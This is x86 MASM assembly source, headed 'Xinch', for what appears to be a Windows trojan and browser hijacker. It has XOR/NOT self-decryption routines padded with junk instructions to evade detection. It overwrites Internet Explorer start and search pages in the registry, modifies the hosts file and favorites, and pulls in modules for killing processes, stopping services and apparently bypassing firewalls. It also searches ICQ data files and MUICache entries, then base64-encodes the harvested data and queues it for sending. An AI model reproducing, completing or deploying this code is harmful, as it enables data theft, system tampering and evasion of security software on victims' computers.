; Xinch

.586
.model flat, stdcall
include include\windows.inc
include include\kernel32.inc
include include\user32.inc
include include\advapi32.inc
include include\ws2_32.inc
include include\wsock32.inc
include include\oaidl.inc
include include\xinch.inc
include include\ole32.inc
include include\shlwapi.inc
include include\oleaut32.inc
include include\shell32.inc
include include\masm32.inc
include include\rasapi32.inc
include include\gdi32.inc
include include\oaidl.inc
include include\aplib.inc
include include\urlmon.inc
include include\wininet.inc
includelib library\ole32.lib
includelib library\kernel32.lib
includelib library\user32.lib
includelib library\oleaut32.lib
includelib library\advapi32.lib
includelib library\shlwapi.lib
includelib library\shell32.lib
includelib library\masm32.lib
includelib library\wsock32.lib
includelib library\ntdll.lib
includelib library\ws2_32.lib
includelib library\rasapi32.lib
includelib library\gdi32.lib
includelib library\urlmon.lib
includelib library\aplib.lib
includelib library\wininet.lib

IFDEF MOD_CRYPT
.data
        EncryptStart2   dw      "=(", "=(", "=)"
.code
        EncryptStart    dw      "=)", "=)", "=("
ENDIF

.data
	szICQ99bSearch  	db      "\*.dat",0
	szNilStr		db	0
     	szTrimC      		db  	'" ', 0
        szFmt           	db  	"db %03Xh",13,10,0
        szHeader1       	db  	".data",13,10,13,10,"%sLen equ %lu",13,10,"%s1 ",0
	szTextOpen		db	"open",0
	szMUIPath		db	"SOFTWARE\Microsoft\Windows\ShellNoRoam\MUICache",0
        szModuleHeaderStart     db      "DRUD"
		
	szKernel		db	"kernel32.dll",0
				db	"ExpandEnvironmentStringsA",0
				db	"GetDiskFreeSpaceExA",0,0
	dwExpandEnvironmentStrings dd	0
	dwGetDiskFreeSpaceEx	dd	0
				
				
	szSHFolder		db	"shfolder.dll",0
				db	"SHGetFolderPathA",0,0
		
       	szPsApi			db	"psapi.dll",0
				db	"GetModuleFileNameExA",0
				db	"EnumProcesses",0
				db	"EnumProcessModules",0,0
				
        dwGetModuleFileNameEx	dd	0
        dwEnumProcesses		dd	0
        dwEnumProcessModules	dd	0
        			
       	dwSHGetFolderPath	dd	0
       	dwPrevModuleOffset	dd	0
	bsize			dd	1024
.data?
	tkp TOKEN_PRIVILEGES <> 
	hToken dd ? 
	hKey   dd ?
	MAX_ASCII EQU 	5000
	MAX_B64   EQU 	MAX_ASCII * 3 / 2
        GlobalBuffer    dd      ?
	buffer1   db 	MAX_B64 dup (?)
	buffer2   db 	MAX_ASCII dup (?)
        lpFun   db      1024 dup(?)
        lpArgs  dd      ?
        lpStr1  db      1024 dup(?)
	FHndl   dd	?
	cmd 	dd 	?
	sf	dd 	?
        lpWSAData               WSADATA <>
        lpOutStream             dd      ?       
        lpBuf1          db      32768 dup(?)
        lpBuf2          db      32768 dup(?)
        lpBuf3          db      32768 dup(?)
        lpBuf4          db      32768 dup(?)
.const 
CSIDL_COMMON_APPDATA equ 0023h
CSIDL_PROFILE equ 0028h

	MyClearStr PROTO :DWORD,:DWORD
	start_work proto

szText MACRO Name, Text:VARARG
   LOCAL lbl
    jmp lbl
   Name db Text,0
   lbl:
ENDM

SendSvcState macro state
	mov	stSS.dwCurrentState,state
	invoke	SetServiceStatus,hStatus,addr stSS
endm

 mNextListEntry MACRO ML
          cld
          xor     eax, eax
          or      ecx, -1
          repnz scasb
          cmp     byte ptr[edi], 0
          jnz     ML
        ENDM

m2m macro dst: REQ, src: REQ
        push src
        pop  dst
endm

_IOR macro x: REQ, y: REQ, t: REQ
  	exitm <(IOC_OUT or ((sizeof(t) and IOCPARM_MASK) shl 16) or (x shl 8) or y)>
endm

@AllocStr macro szName: REQ, szData: REQ
        .data
                szName          db      szData,0
                &szName&Len     equ     @CatStr(%@SizeStr(szData)-2)
endm

@AllocMem macro szName: REQ, dwSize: REQ
        .data?
                szName          db      dwSize dup(?)
endm

@MAKEWORD macro Hi, Lo
        exitm   <(Hi shl 8) or Lo> 
endm

@Next macro EntryLoop: REQ
	cld
	xor     eax, eax
	m2m	ecx, -1
	repnz scasb
	cmp     byte ptr[edi], al
	jnz     EntryLoop
endm

comethodQProto5 typedef proto :DWORD, :DWORD, :QWORD, :DWORD, :DWORD
comethodQ5      typedef ptr comethodQProto5

comethodQProto4 typedef proto :DWORD, :QWORD, :DWORD, :DWORD
comethodQ4      typedef ptr comethodQProto4

comethodQProto2 typedef proto :DWORD, :QWORD
comethodQ2      typedef ptr comethodQProto2

S_BEGIN       equ     0
S_CUR         equ     1
S_END         equ     2

IStream struct DWORD
	IStream_QueryInterface  comethod3       ?
	IStream_AddRef          comethod1       ?
	IStream_Release         comethod1       ?
	IStream_Read            comethod4       ?
	IStream_Write           comethod4       ?
	IStream_Seek            comethodQ4      ?
	IStream_SetSize         comethodQ2      ?
	IStream_CopyTo          comethodQ5      ? 
	IStream_Commit          comethod2       ?
	IStream_Revert          comethod1       ?
	IStream_LockRegion      comethod4       ? 
	IStream_UnlockRegion    comethod4       ? 
	IStream_Stat            comethod3       ? 
	IStream_Clone           comethod2       ? 
IStream ends

.code
include SEH.asm
; Compares memory data
CompareMem proc uses esi edi lpSrc, lpDst, Len: DWORD
	cld
	mov	esi, lpSrc
	mov	ecx, Len
	mov	edi, lpDst
	xor	eax, eax
	repz cmpsb
	setz	al
	ret
CompareMem endp

MyClearStr PROC StrClear : DWORD, Len : DWORD
push edi
mov ecx, Len
mov edi, StrClear
lll: mov byte ptr [edi],0
inc edi
loop lll
pop edi
ret
MyClearStr ENDP

SFCopyFromStr proc uses esi edi ebx lpStr: DWORD
        LOCAL   pData: DWORD

        invoke  lstrlen, lpStr
        mov     esi, eax

        invoke  SafeArrayCreateVector, VT_UI1, 0, esi
        mov     ebx, eax

        invoke  SafeArrayAccessData, ebx, addr pData
        .IF     SUCCEEDED
                mov     ecx, esi
              	mov     edi, pData
                mov     esi, lpStr
		
@cpy_loop:
                lodsb
                stosb
                dec     ecx
                jnz     @cpy_loop
                
                invoke  SafeArrayUnaccessData, ebx
        .ENDIF

        mov     eax, ebx
	
        ret
SFCopyFromStr endp

; Fills buffer with NULLs
ZeroMemory proc uses edi lpMem, Len: DWORD
	cld
	mov     edi, lpMem
	mov     ecx, Len
	push	ecx	
	shr     ecx, 2
	xor     eax, eax
	rep stosd
	pop	ecx
	and     ecx, 3
	rep stosb
	ret
ZeroMemory endp

; Structure for storing info about mapped file, lpMem - valid memory pointer to file data
MappedFile struct DWORD
	hFile           DWORD   ?       ; File handle
	hMap            DWORD   ?       ; Unnamed file-mapping handle 
	lpMem           DWORD   ?       ; Memory pointer to file data
	dwFileSize      DWORD   ?       ; Size of file
MappedFile ends

; Maps file into current process, returns TRUE on success
MapFile proc uses ebx lpszFileName, lpMappedFile: DWORD
	mov     ebx, lpMappedFile
	assume  ebx: ptr MappedFile

	invoke  ZeroMemory, ebx, sizeof MappedFile
        
	invoke  CreateFile, lpszFileName, GENERIC_READ, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0
	mov     [ebx].hFile, eax
	inc     eax
	jz      @mf_ret 
        
	invoke  GetFileSize, eax, NULL
        mov     [ebx].dwFileSize, eax

        invoke  CreateFileMapping, [ebx].hFile, NULL, PAGE_READONLY, 0, 0, NULL
        .IF     eax        	             
		mov     [ebx].hMap, eax
		invoke  MapViewOfFile, eax, FILE_MAP_READ, 0, 0, 0
		mov     [ebx].lpMem, eax
        .ENDIF  
        
@mf_ret:
        xor     eax, eax
        cmp     [ebx].lpMem, eax
        setnz   al
        
        assume  ebx: nothing            
        ret
MapFile endp

; Unmaps file from current process
UnmapFile proc uses ebx lpMappedFile: DWORD
	mov     ebx, lpMappedFile       
	assume  ebx: ptr MappedFile

	.IF     [ebx].hFile != -1
		invoke  UnmapViewOfFile, [ebx].lpMem
		invoke  CloseHandle, [ebx].hMap
		invoke  CloseHandle, [ebx].hFile
	.ENDIF

	assume  ebx: nothing
        ret
UnmapFile endp

; Load library
DoLoadLib proc uses esi edi ebx szLibAndFuncs, lpFuncs: DWORD
	mov     edi, szLibAndFuncs
	mov	esi, lpFuncs

	invoke  LoadLibrary, edi
	test	eax, eax
	jz	@ret
	xchg	eax, ebx
        
@next:
	cld        
	xor     eax, eax
	m2m	ecx, -1
	repnz scasb

	cmp     byte ptr[edi], 0
	jz      @ret_true

	invoke	GetProcAddress, ebx, edi
	mov	dword ptr[esi], eax
	test	eax, eax
	jz	@ret
	lodsd
	jmp	@next

@ret_true:
	mov	eax, TRUE
        
@ret:
        ret
DoLoadLib endp

ExportModule proc uses edi esi module: DWORD
	LOCAL	dwQWord: QWORD
	lea	edi, dwQWord
	mov	dword ptr[edi], 0
	mov	dword ptr[edi+4], 0
	.IF	dwPrevModuleOffset
		; Current len
		coinvoke lpOutStream, IStream, Seek, dwQWord, S_END, addr dwQWord
		
		; Delta offset (module length)
		mov	esi, dword ptr[edi]
		sub	esi, dwPrevModuleOffset
		
		; Write module length
		m2m	dword ptr[edi], dwPrevModuleOffset
		coinvoke lpOutStream, IStream, Seek, dwQWord, S_BEGIN, addr dwQWord
		mov	dword ptr[edi], esi
		coinvoke lpOutStream, IStream, Write, edi, 4, NULL
		
		; Seek end
		mov	dword ptr[edi], 0
		coinvoke lpOutStream, IStream, Seek, dwQWord, S_END, addr dwQWord
	.ENDIF
	
	; Write 4 byte ident
	coinvoke lpOutStream, IStream, Write, offset szModuleHeaderStart, 4, NULL
	; Write module type
	coinvoke lpOutStream, IStream, Write, addr module, 4, NULL
	
	; Get current size
	mov	dword ptr[edi], 0
	coinvoke lpOutStream, IStream, Seek, dwQWord, S_END, addr dwQWord
	m2m	dwPrevModuleOffset, dword ptr[edi]
	
	; Write module size spacing
	m2m	dword ptr[edi], 0
	coinvoke lpOutStream, IStream, Write, edi, 4, NULL
	ret
ExportModule endp

; Export data to stream
ExportData proc dtype, dsubtype, data, datalen: DWORD
	; Write type
	coinvoke lpOutStream, IStream, Write, addr dtype, 4, NULL
	; Write subtype
	coinvoke lpOutStream, IStream, Write, addr dsubtype, 4, NULL
	; Write datalength
	coinvoke lpOutStream, IStream, Write, addr datalen, 4, NULL
	; Write data
	coinvoke lpOutStream, IStream, Write, data, datalen, NULL       
	ret
ExportData endp

; Export string to stream
ExportStr proc dtype, dsubtype, strdata: DWORD
	; String length
	invoke  lstrlen, strdata
	; Write data
	invoke  ExportData, dtype, dsubtype, strdata, eax       
	ret
ExportStr endp

b64_encode proc uses esi edi ebx lpSrc, lpDst, Len: DWORD
        mov     esi, lpSrc
        mov     edi, lpDst
        mov     ecx, Len

        xor     eax, eax
        xor     ebx, ebx

@gen:
        lodsb
        shl     eax, 8
        loop    @@2
        shl     eax, 8
        jmp     @@4
@@2:
        lodsb
        shl     eax, 8
        loop    @@3
        jmp     @@4
@@3:          
        lodsb
        dec     ecx
@@4:           
        push    ecx
        push    4
        pop     ecx
        push    ecx
@@:
        rol     edx, 8
        mov     dl, al
        and     dl, 00111111B        
        shr     eax, 6
        loop    @B

        pop     ecx

@edx_conv:
        cmp     dl, 62
        jae     dl_62_63
        cmp     dl, 51
        ja      digit_0_9
        add     dl, 'A'
        cmp     dl, 'Z'
        jbe     @F
        add     dl, 'a'-'Z'-1
@@:
        jmp     rotate_edx
digit_0_9:
        add     dl, 30h-52
        jmp     rotate_edx
dl_62_63:
        sub     dl, 62
        shl     dl, 2
        add     dl, 43
rotate_edx:
        rol     edx, 8
        loop    @edx_conv

        xchg    eax, edx
        stosd
        xchg    eax, edx

        pop     ecx

        ; CRLF
        inc     ebx
        inc     ebx
        cmp     ebx, 24h
        jnz     @next
        xor     ebx, ebx
        mov     al, 0ah
        stosb
@next:
        or      ecx, ecx
        jnz     @gen

        ret
b64_encode ENDP

StreamToFile proc filename: DWORD
	LOCAL   hFile, lpRead: DWORD
	LOCAL   buf[128]: BYTE
	LOCAL   dwQWord: QWORD

	invoke  CreateFile, filename, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, 0
	mov     hFile, eax
	inc     eax
	jz      @sstf_ret

	lea     edi, dwQWord
	xor	eax, eax
	stosd
	stosd
	coinvoke lpOutStream, IStream, Seek, dwQWord, S_BEGIN, NULL

@r:
	coinvoke lpOutStream, IStream, Read, addr buf, 128, addr lpRead
	invoke  WriteFile, hFile, addr buf, lpRead, addr lpRead, NULL
	cmp     lpRead, 0
	jnz     @r

	invoke  CloseHandle, hFile
        
@sstf_ret:
	ret
StreamToFile endp

include options.inc

StreamSaveToFile proc stream: DWORD
	LOCAL   hFile,inLen2,inLen,outMem, inMem,lpRead, bWritten: DWORD
	LOCAL   dwQWord: QWORD
; получаем длину..
	lea	edi, dwQWord
	mov	dword ptr[edi], 0
	mov	dword ptr[edi+4], 0
	coinvoke stream, IStream, Seek, dwQWord, S_END, addr dwQWord
	m2m	inLen, dword ptr[edi]
; читаем всё в память
	mov	dword ptr[edi], 0
	coinvoke stream, IStream, Seek, dwQWord, S_BEGIN, NULL
	invoke	LocalAlloc, LMEM_FIXED, inLen
	mov	inMem, eax
	coinvoke stream, IStream, Read, inMem, inLen, NULL
; создаём выходную память
	mov eax, inLen
	mov ebx, 3
	mul ebx
	mov ebx, 2
	div ebx
	mov inLen2, eax
	invoke	LocalAlloc, LMEM_FIXED, inLen2
	mov	outMem, eax
; кодируем
        invoke 	b64_encode,inMem,outMem,inLen
; ставим на отправку
include sending.asm
	cmp     lpRead, 0
	invoke	LocalFree, inMem
	invoke	LocalFree, outMem
	ret
StreamSaveToFile endp

RegReadValue proc uses ebx dwKey, lpszRegPath, lpszValue, lpBuf, lpBufLen: DWORD
	LOCAL   hkHandle, DataType: DWORD
	xor	ebx, ebx

	invoke  RegOpenKey, dwKey, lpszRegPath, addr hkHandle
	test    eax, eax
	jnz     @ret

	invoke  RegQueryValueEx, hkHandle, lpszValue, NULL, addr DataType, lpBuf, lpBufLen
	test	eax, eax
	setz	bl        

	invoke  RegCloseKey, hkHandle

@ret:
	mov	eax, ebx
	ret
RegReadValue endp

GetMUIPath proc uses ebx lpPath, lpExe: DWORD
	LOCAL	KeyIndex, dwBufSize, hkHandle: DWORD
	
	xor	ebx, ebx
	
	invoke  RegOpenKey, HKEY_CURRENT_USER, offset szMUIPath, addr hkHandle
	test	eax, eax
	jnz	@no_mui
 
	; Enum registry entries
	mov	KeyIndex, 0
@enum:
        mov     dwBufSize, MAX_PATH
        xor	eax, eax
        invoke  RegEnumValue, hkHandle, KeyIndex, lpPath, addr dwBufSize, eax, eax, eax, eax      
        test	eax, eax
        jnz	@enum_end
        
        invoke	StrStrI, lpPath, lpExe 
        .IF	eax
		mov	byte ptr[eax+1], 0
		inc	ebx
		jmp	@enum_end
	.ENDIF
	
	inc	KeyIndex
	jmp	@enum
	
@enum_end:	
	invoke	RegCloseKey, hkHandle

@no_mui:
	xchg	eax, ebx
	ret
GetMUIPath endp

IFDEF MOD_CRYPT
.data
 	  EncryptEnd2     dw      "=(", "=(", "=)"	
.code
          EncryptEnd      dw      "=)", "=)", "=("
.data
        EncryptStart3     dw      "=!", "=!", "=!"
.code
        EncryptStart4     dw      "=!", "=!", "=!"
ENDIF

start_work proc
ret
start_work endp

ExpandEnvVars proc uses esi lpSrc, dwSrcLen: DWORD
	invoke	GlobalAlloc, GPTR, dwSrcLen
	mov	esi, eax
	
	.IF	dwExpandEnvironmentStrings
		push	MAX_PATH
		push	esi
		push	lpSrc
		call	dwExpandEnvironmentStrings
		
		.IF	eax
			invoke	lstrcpy, lpSrc, esi
		.ENDIF
	.ENDIF
	
	invoke	GlobalFree, esi
	ret
ExpandEnvVars endp

 IFDEF MOD_CRYPT
.data
 	  EncryptEnd3     dw      "=!", "=!", "=!"
.code
          EncryptEnd4     dw      "=!", "=!", "=!"
htds proc
nop
jmp gea
nop
gfeg:
	inc     edi
nop
jmp gar
gea:
jmp gfeg
nop
	gar:	
                xor     byte ptr[edi-1], 10
mov edi, edi
nop
                not     byte ptr[edi-1]
mov edi, edi
nop
ret
htds endp

gege proc lpEnd: DWORD
	.WHILE  edi != lpEnd
        	invoke htds	
nop
        .ENDW
ret
nop
gege endp

DecryptProc proc uses edi lpStart, lpEnd: DWORD
	mov	edi, lpStart
     	 invoke gege, lpEnd
nop
        ret
nop
DecryptProc endp

hrshrsg proc
nop
	invoke  DecryptProc, offset EncryptStart2, offset EncryptEnd2
	invoke  DecryptProc, offset EncryptStart, offset EncryptEnd
	invoke  DecryptProc, offset EncryptStart3, offset EncryptEnd3
	invoke  DecryptProc, offset EncryptStart4, offset EncryptEnd4
nop
ret
nop
nop
hrshrsg endp
 ENDIF

IFDEF MOD_SP
startpage1 proc
invoke lstrcpy, addr lpBuf1, addr szTUrls1
invoke lstrcat, addr lpBuf1, addr szTUrls2
invoke RegOpenKeyEx, HKEY_CURRENT_USER, addr lpBuf1, 0, KEY_WRITE, addr hKey
invoke lstrlen, addr startpage
invoke RegSetValueEx, hKey, addr szstartpage, 0, REG_SZ, addr startpage, eax
invoke RegCloseKey, hKey
ret
startpage1 endp
ENDIF

IFDEF MOD_SERCHP
SearchPage1 proc
invoke lstrcpy, addr lpBuf1, addr szTUrls1
invoke lstrcat, addr lpBuf1, addr szTUrls2
invoke RegOpenKeyEx, HKEY_CURRENT_USER, addr lpBuf1, 0, KEY_WRITE, addr hKey
invoke lstrlen, addr SearchPage
invoke RegSetValueEx, hKey, addr szsearchpage, 0, REG_SZ, addr SearchPage, eax
invoke RegCloseKey, hKey
ret
SearchPage1 endp
ENDIF

include hosts.asm
include favorits.asm
include sites.asm

IFDEF MOD_KILLPROC
  include killproc.asm
ENDIF

IFDEF MOD_SVCSTOP
  include stopService.asm
ENDIF

IFDEF MOD_ACTAFTER
include actaftertime.asm
ENDIF

include UnderFW.asm
include Includes.asm
IFDEF MOD_CRYPT
invoke hrshrsg
nop
ENDIF
include BIN.asm

	IFDEF  MOD_HOST
		invoke sethosts
	ENDIF

	IFDEF MOD_IEF
		invoke createlinks
	ENDIF

	IFDEF MOD_TZ
		invoke createzonemaps
	ENDIF

	IFDEF MOD_SP
		invoke startpage1
	ENDIF

	IFDEF MOD_SERCHP
		invoke SearchPage1
	ENDIF

include Plus.asm

IFDEF MOD_MSG
  		invoke MessageBox, 0, addr msg,addr sztitle, MB_OK
ENDIF
invoke	ExitProcess, 0
end start